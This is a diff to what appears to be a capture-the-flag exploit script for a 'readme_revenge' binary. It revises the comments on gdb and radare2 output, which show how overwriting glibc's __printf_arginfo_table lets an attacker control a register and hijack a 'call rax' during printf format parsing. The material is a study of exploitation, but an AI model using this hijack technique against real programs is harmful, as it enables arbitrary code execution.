@@ -34,10 +34,10 @@ Dump of assembler code for function __parse_one_specmb:
 ... 
 
 gef➤  print $rax
-$2 = 0x4141414141414141
+$2 = 0x4141414141414141 <-- $rax is controlled ('AAAAAAAA')
 
 gef➤  print $rdx
-$3 = 0x73
+$3 = 0x73 <-- $rdx is ord('s')
 
 
 [0x00000000]> pd 20 @ 0x45ad08
@@ -50,7 +50,7 @@ $3 = 0x73
 |           0x0045ad20    488d5334     lea rdx, [rbx+0x34]
 |           0x0045ad24    be01000000   mov esi, 0x1
 |           0x0045ad29    4889df       mov rdi, rbx
-|           0x0045ad2c    ffd0         call rax <-- !!!!!
+|           0x0045ad2c    ffd0         call rax <-- we can control $rax (*__printf_arginfo_table['s'])()
 |
 
 if (__builtin_expect (__printf_function_table == NULL, 1)
@@ -60,7 +60,7 @@ if (__builtin_expect (__printf_function_table == NULL, 1)
                                     (&spec->info, 1, &spec->data_arg_type,
                                     &spec->size)) < 0)
 
-rcx+rdx*8 --> __printf_arginfo_table + 's'*8 and we can control __printf_arginfo_table.
+rcx+rdx*8 --> __printf_arginfo_table + 's'*8 and we can overwrite __printf_arginfo_table.
 """
 
 r = process('./readme_revenge')
